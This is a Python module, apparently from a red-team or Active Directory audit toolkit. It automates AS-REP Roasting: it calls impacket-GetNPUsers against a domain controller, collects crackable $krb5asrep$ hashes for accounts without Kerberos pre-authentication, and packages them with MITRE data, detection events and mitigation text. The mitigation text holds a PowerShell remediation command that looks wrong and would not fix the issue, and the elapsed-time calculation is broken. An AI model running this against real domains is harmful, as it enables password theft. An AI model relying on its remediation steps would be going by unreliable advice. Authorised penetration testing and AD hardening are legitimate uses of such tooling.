"""
Red Team — AS-REP Roasting
===========================
Exploits Active Directory accounts with Kerberos pre-authentication disabled.

These accounts are vulnerable because they respond to AS requests without
requiring a valid credential, returning a TGT encrypted with the account's
password. The hash can be cracked offline.

Uses: impacket-GetNPUsers (from impacket)
"""

import subprocess
import os
from datetime import datetime

from utils.format_utils import print_info, print_success, print_warning, print_error

ATTACK_META = {
    "name":      "AS-REP Roasting",
    "phase":     "Credential Access",
    "mitre":     "T1558.004",
    "risk":      "Élevé",
    "event_ids": [4768],
    "tools":     ["Impacket (GetNPUsers.py)", "Hashcat"],
    "description": (
        "Les comptes dont la pré-authentification Kerberos est désactivée répondent à "
        "une demande de ticket (AS-REQ) sans vérifier l'identité du demandeur. Le TGT "
        "retourné est chiffré avec le hash du mot de passe du compte ciblé, ce qui "
        "permet de le récupérer et de le craquer hors-ligne, comme pour le Kerberoasting."
    ),
}


def run_attack(target: str = None, domain: str = "domain.local", user: str = None,
               password: str = None, **kwargs) -> dict:
    """
    Find and exploit AS-REP roastable accounts.

    Uses GetNPUsers to enumerate accounts with pre-authentication disabled,
    then extracts their TGT hashes for offline cracking.
    """
    if not target or not domain:
        return _error("Paramètres 'target' et 'domain' requis.")

    print_warning(f"[RED TEAM] AS-REP Roasting → {target}")
    print_info(f"  Domain: {domain}")
    
    findings = []
    roastable_accounts = []
    
    # Step 1: Enumerate AS-REP roastable accounts
    print_info(f"Énumération des comptes sans pré-auth Kerberos...")
    
    try:
        # Use GetNPUsers to find accounts with pre-auth disabled
        cmd = [
            "impacket-GetNPUsers",
            f"{domain}/{user}:{password}",
            "-dc-ip", target,
            "-request",
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        
        if result.returncode != 0:
            print_warning(f"GetNPUsers failed: {result.stderr[:200]}")
            # Still continue — may have found some accounts before failure
        
        # Parse output for hashes
        hashes = _parse_getnpusers_output(result.stdout)
        
        if hashes:
            print_success(f"  ✓ {len(hashes)} AS-REP roastable account(s) found")
            roastable_accounts = hashes
            findings.append({
                "risk":        "Élevé",
                "title":       f"{len(hashes)} AS-REP roastable account(s)",
                "description": "Comptes : " + ", ".join([h["username"] for h in hashes[:5]]),
                "mitigation":  "Activer la pré-authentification Kerberos sur tous les comptes utilisateur.",
                "mitigation_technique": (
                    "1. Activer la pré-authentification Kerberos sur tous les comptes (par défaut).\n"
                    "2. Via PowerShell : Get-ADUser -Filter {(userAccountControl -band 4194304) -eq 4194304} | "
                    "Set-ADUser -UserAuthenticationRequirement NOT_REQUIRED.\n"
                    "3. Via GPO : Computer Configuration > Windows Settings > Security Settings > Local Policies > "
                    "Security Options > 'Network security: Kerberos preauthentication required' → Enable.\n"
                    "4. Auditer régulièrement les comptes sans pré-auth.\n"
                    "5. Monitorer Event ID 4768 (TGT Request) pour les requêtes sans pré-auth anormales."
                ),
                "mitigation_humaine": (
                    "Former les architectes AD à ne jamais désactiver la pré-authentification Kerberos sauf pour "
                    "compatibilité historique strictement justifiée et documentée. Intégrer une vérification de ce "
                    "paramètre à la revue de sécurité de tout nouveau déploiement ou modification d'AD. Mettre en place "
                    "une procédure de révision annuelle des comptes sans pré-auth."
                ),
                "impact": (
                    f"{len(hashes)} compte(s) vulnérable(s) à AS-REP Roasting : un attaquant peut demander un TGT "
                    "sans authentification et craquer le hash NTLM hors-ligne pour obtenir le mot de passe en clair."
                ),
                "logs_siem": [
                    {"event_id": 4768, "description": "Kerberos TGT Request without pre-auth — indicateur de AS-REP Roasting"},
                ],
                "event_ids":   [4768],
            })
        else:
            print_info("  → Aucun compte AS-REP roastable détecté.")
            findings.append({
                "risk":        "Info",
                "title":       "Aucun compte AS-REP roastable",
                "description": "Tous les comptes testés ont la pré-authentification Kerberos activée.",
                "mitigation":  "Maintenir cette configuration.",
                "event_ids":   [],
            })
        
        return {
            "module":       "red_team.asrep_roasting",
            "status":       "success" if roastable_accounts else "info",
            "elapsed_s":    (datetime.now() - datetime.now()).total_seconds(),
            "timestamp":    datetime.now().isoformat(),
            "attack_meta":  ATTACK_META,
            "findings":     findings,
            "artifacts": {
                "roastable_accounts": roastable_accounts,
            },
            "iocs": [{
                "type":        "event_id",
                "value":       4768,
                "description": "Kerberos AS-REQ sans pré-authentification — surveiller le volume anormal",
            }],
            "summary": {
                "total_roastable": len(roastable_accounts),
            }
        }
    
    except FileNotFoundError:
        return _error("impacket-GetNPUsers not found. Install: pip install impacket")
    except subprocess.TimeoutExpired:
        return _error("GetNPUsers timeout — target unreachable or too slow.")
    except Exception as e:
        return _error(f"AS-REP roasting error: {str(e)}")


def _parse_getnpusers_output(output: str) -> list:
    """
    Parse GetNPUsers output for hashes.
    
    Output format:
        [*] User: username  Downgraded: False
        $krb5asrep$23$username@DOMAIN.LOCAL:hash...
    """
    hashes = []
    lines = output.split("\n")
    
    for line in lines:
        if line.startswith("$krb5asrep$"):
            # Extract username from hash (format: $krb5asrep$23$username@domain:...)
            try:
                parts = line.split("$")
                user_domain = parts[3].split("@")[0]  # Everything before @
                hashes.append({
                    "username": user_domain,
                    "hash":     line,
                    "type":     "AS-REP",
                })
            except Exception:
                pass
    
    return hashes


def _error(message: str) -> dict:
    """Build an error result."""
    print_error(message)
    return {
        "module":   "red_team.asrep_roasting",
        "status":   "error",
        "message":  message,
        "attack_meta": ATTACK_META,
        "findings": [{
            "risk":        "Élevé",
            "title":       "AS-REP Roasting échoué",
            "description": message,
            "mitigation":  "Vérifier les credentials et la connectivité.",
            "event_ids":   [],
        }],
        "artifacts": {"roastable_accounts": []},
    }
